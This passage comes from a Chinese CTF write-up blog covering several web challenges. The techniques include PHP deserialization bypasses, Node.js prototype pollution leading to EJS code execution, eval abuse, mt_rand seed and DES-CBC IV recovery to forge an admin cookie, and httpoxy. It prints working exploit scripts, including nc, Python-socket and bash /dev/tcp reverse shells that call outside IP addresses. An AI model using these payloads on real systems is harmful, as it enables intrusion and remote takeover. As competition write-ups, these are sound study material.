class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有一个反序列化，触发<code>__destruct()</code>函数，然后调用<code>content_to_file()</code>函数，$gf里面不能有字母数字和其他一些符号，把gf赋给content后，调用aiisc_to_chr()函数，以两位为单位分割成一个数组，依次取数组中的内容放到chr()里面，之后进行拼接，然后变成小写，送到<code>content_to_file</code>中，pass变量通过换行就可以绕过，$gf通过取反来绕过，后面有变小写的操作，那么传过去FLAG就可以了，把FLAG按chr（）逆过来就是</p>
<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310135900470.png" alt="image-20200310135900470" style="zoom:200%;">

<p>70766571，那么我们就要让content等于这个，但又过滤了字母和数字，可以这样</p>
<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310140052720.png" alt="image-20200310140052720" style="zoom:200%;">

<p>然后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;    </span><br><span class="line"><span class="comment">// $gf = "70766571";    </span></span><br><span class="line"><span class="keyword">public</span> $gf = <span class="string">"~\C8\xCF\xC8\xC9\xC9\xCA\xC8\xCE"</span>; </span><br><span class="line">&#125;</span><br><span class="line">$trick = <span class="keyword">new</span> trick(); </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($trick));</span><br></pre></td></tr></table></figure>

<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309210747399.png" alt="image-20200309210747399" style="zoom:150%;">



<h1 id="guess-game"><a href="#guess-game" class="headerlink" title="guess game"></a>guess game</h1><p>看到log函数里面有merge，那么可以原型链污染了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">userInfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> logItem = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">    merge(logItem,userInfo);</span><br><span class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后post/路由中调用了log</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//So terrible code~</span></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.user.username != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//console.log(req.body.user.username);</span></span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.user.username.includes(<span class="string">"admin"</span>))&#123;</span><br><span class="line">            res.end(<span class="string">"any admin user has been baned"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.user.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                <span class="comment">//only log admin's activity</span></span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(<span class="string">"ok"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>需要满足输入的username的大写要等于 “admin888”的大写，利用javascript的大小写特性，就可以绕过，然后试了试之前ejs模板的反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:<span class="literal">True</span>,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line">r=requests.get(url,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.textimport requests</span><br><span class="line">url=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:<span class="literal">True</span>,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>竟然可以</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309222006644.png" alt="image-20200309222006644"></p>
<h1 id="happy-vacation"><a href="#happy-vacation" class="headerlink" title="happy vacation"></a>happy vacation</h1><p>在本地测试一下，把他的注释去掉，提示说重点在选择那里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Asker</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $question;</span><br><span class="line">	<span class="keyword">public</span> $right;</span><br><span class="line">	<span class="keyword">public</span> $answer;</span><br><span class="line">	<span class="keyword">public</span> $times = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">public</span> $A = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $B = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $C = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $D = <span class="keyword">True</span>;</span><br><span class="line">	<span class="keyword">public</span> $message = <span class="string">"大郎快醒醒，老师叫你回答问题啦！"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;question = <span class="string">"what is your problem?"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;right = <span class="string">"A"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;answer_list = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">answerList</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;answer_list;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">mes</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">updateList</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;answer_list = [];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;A ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"A"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;B ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"B"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;C ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"C"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;D ? array_push(<span class="keyword">$this</span>-&gt;answer_list, <span class="string">"D"</span>) : <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;message = <span class="string">"这都能答错，再给你一次机会！"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">answer</span><span class="params">($user, $answer)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;user = <span class="keyword">clone</span> $user;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;right == $answer)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;message = <span class="string">"clever man!"</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/[^a-zA-Z_\-&#125;&gt;@\]*]/i"</span>, $answer))&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;message = <span class="string">"no no no"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(preg_match(<span class="string">'/f|sy|and|or|j|sc|in/i'</span>, $answer))&#123;</span><br><span class="line">					<span class="comment">// Big Tree 说这个正则不需要绕</span></span><br><span class="line">					<span class="keyword">$this</span>-&gt;message = <span class="string">"what are you doing bro?"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">eval</span>(<span class="string">"\$this-&gt;"</span>.$answer.<span class="string">" = false;"</span>);</span><br><span class="line">					<span class="keyword">$this</span>-&gt;updateList();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;times ++;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">times</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;times;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个eval的操作,然后测试能把blacklist置为false,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223348604.png" alt="image-20200309223348604"></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223311442.png" alt="image-20200309223311442">然后就传个php文件到upload目录，路径从upload函数也可以知道，应该非预期了。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309223544545.png" alt="image-20200309223544545"></p>
<h1 id="nothardweb"><a href="#nothardweb" class="headerlink" title="nothardweb"></a>nothardweb</h1><p>利用之前的mt_rant()函数间隔226个随机数的两个数可以得到seed,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309233302645.png" alt="image-20200309233302645"></p>
<p>接下来审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">    $IV = <span class="string">"********"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">            $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = <span class="string">"guest"</span>;</span><br><span class="line">        $o = <span class="keyword">new</span> User($username);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    md5(openssl_encrypt(base64_decode($cookie[<span class="string">'user'</span>]),<span class="string">'des-cbc'</span>,sessionkey,<span class="number">0</span>,sessioniv))==cookie[<span class="string">'hash'</span>]</span><br></pre></td></tr></table></figure>

<p>可以看到我们第一次到这个页面，他会用第229个随机数和0x5f5e0ff异或，得到的值作为key,然后采用des-cbc的加密方式对序列化后的数据加密，然后我们可以通过之前的方式得到key,然后就是通过找到IV去伪造成admin,先介绍下des-cbc的加密方式，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/20180901170843459.png" alt="img"></p>
<p>我们现在已知明文、密文、key,然后去求IV，看加密的图可以知道，第一块中加密的值是IV和分组一的异或值，如果我们把iv和分组一互换的话，是不会影响后面的密文的，那么在这道题里，我们通过把解密的iv,替换为我们明文的分组一，那么解密出来的明文的第一个分组就是IV，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">3946604448</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt;= <span class="number">226</span>; $i++) &#123;</span><br><span class="line">	mt_rand();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="comment">//$username = "guest";</span></span><br><span class="line"><span class="comment">//$o = new User($username);</span></span><br><span class="line"><span class="comment">//echo $o-&gt;show();</span></span><br><span class="line"><span class="comment">//$ser_user = serialize($o);</span></span><br><span class="line"><span class="comment">//echo $ser_user . "\n";</span></span><br><span class="line"><span class="comment">//O:4:"User":1:&#123;s:</span></span><br><span class="line"><span class="comment">//8:"username";s:5</span></span><br><span class="line"><span class="comment">//:"guest";&#125;</span></span><br><span class="line"><span class="comment">//echo base64_decode("RjVqcnlFR2FEd0JMazFXSDJLZzhHZGw3Q0M2SkRNS2ZOY2FlTWMreDlSdFdoYVJXaXk4UHU4RW9zT3JnV0c5Nw==");</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">//F5jryEGaDwBLk1WH2Kg8Gdl7CC6JDMKfNcaeMc+x9RtWhaRWiy8Pu8EosOrgWG97</span></span><br><span class="line">$uid = openssl_decrypt(<span class="string">'F5jryEGaDwBLk1WH2Kg8Gdl7CC6JDMKfNcaeMc+x9RtWhaRWiy8Pu8EosOrgWG97'</span>, <span class="string">'des-cbc'</span>, <span class="string">"77889691"</span>, <span class="number">0</span>, <span class="string">'O:4:"Use'</span>);</span><br><span class="line"><span class="keyword">echo</span> $uid;</span><br><span class="line">$IV=<span class="string">"85196940"</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user =serialize($o);</span><br><span class="line"></span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, <span class="string">"77889691"</span>, <span class="number">0</span>, $IV);</span><br><span class="line"><span class="keyword">echo</span> $cipher;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($cipher);</span><br></pre></td></tr></table></figure>

<p>然后我们伪造成admin，复现到这的时候环境已经关了，看wp上面hind.php的内容是,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I left a shell in <span class="number">10.10</span><span class="number">.1</span><span class="number">.12</span>/index.php</span><br><span class="line"><span class="keyword">try</span> to get it!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">        $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后要打内网，这里可以通过soapclient反序列化ssrf,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cc&#x3D;&#96;$cc&#96;;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxxxx&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>就可以反弹shell了,后面就没做了。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>V&amp;N招新赛web部分题解</title>
    <url>/2020/02/29/V/</url>
    <content><![CDATA[<p>V&amp;N招新赛部分web题解</p>
<a id="more"></a>

<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考点：ctfd漏洞</p>
<p>参考链接<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>漏洞的相关分析，上文写的很详细，这里就不再介绍。</p>
<p>解题步骤：</p>
<ol>
<li>先注册一个admin的账号，通过在admin前面加空格来绕过重复限制。</li>
<li>生成忘记密码的链接。</li>
<li>更改自己用户名为非admin.</li>
<li>点击更改密码的链接，改后登录</li>
</ol>
<p><img src="/2020/02/29/V/image-20200229183951772.png" alt="image-20200229183951772"></p>
<p>下载，后就得到flag.</p>
<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考点：python反弹shell   proc目录</p>
<p>访问就可以得到源码，右键源代码看到的代码自动有换行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>看到很简单的源码，有两个路由，</p>
<ul>
<li>/  ：可以得到app.py源码</li>
<li>/shell  : 通过传入c变量可以执行命令，但是会删除flag.txt文件。</li>
</ul>
<p>开始时，想着通过类似时间盲注的方法去做题，后来一想python可以直接反弹shell,</p>
<p>然后开了个linux-lab，反弹shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.234%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/29/V/image-20200229184920698.png" alt="image-20200229184920698"></p>
<p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p>
<p><img src="/2020/02/29/V/image-20200229185248748.png" alt="image-20200229185248748"></p>
<p>由于ps命令不可用，这里我们就去翻一下文件夹</p>
<p><img src="/2020/02/29/V/image-20200229185546941.png" alt></p>
<p>最后在/proc/10/fd文件里看见了flag</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这题也给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>队友直接发了一个<strong>cve-2016-5385</strong>，然后去网上查一查，看到<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhub里面就有</a>看一下里里面的源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>

<p>源码差不多</p>
<blockquote>
<p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
</blockquote>
<p>这种漏洞的利用，通过在http请求头中添加Proxy头，就可以把请求代理到恶意的代理服务器，进而可以窃取数据报的敏感信息，也可以篡改请求报的响应。</p>
